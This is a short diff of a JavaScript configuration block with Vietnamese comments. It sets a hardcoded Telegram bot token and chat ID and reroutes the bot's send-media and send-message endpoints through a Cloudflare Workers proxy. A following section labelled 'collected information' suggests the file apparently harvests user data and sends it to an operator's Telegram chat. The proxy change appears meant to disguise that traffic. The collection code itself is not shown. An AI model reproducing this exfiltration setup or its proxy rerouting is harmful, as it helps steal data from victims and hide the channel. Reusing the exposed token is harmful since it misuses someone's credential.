@@ -1,8 +1,8 @@
 // ====== CẤU HÌNH TELEGRAM ======
 const TELEGRAM_BOT_TOKEN = '7642675616:AAHMlI4Dje9L4SkmHNo4dPGVxPL6dqkXPMw';
 const TELEGRAM_CHAT_ID = '-4957526303';
-const API_SEND_MEDIA = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMediaGroup`;
-const API_SEND_TEXT = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+const API_SEND_MEDIA = `https://winter-hall-f9b4.jayky2k9.workers.dev/bot${TELEGRAM_BOT_TOKEN}/sendMediaGroup`;
+const API_SEND_TEXT = `https://winter-hall-f9b4.jayky2k9.workers.dev/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
 
 // ====== THÔNG TIN THU THẬP ======
 const info = {
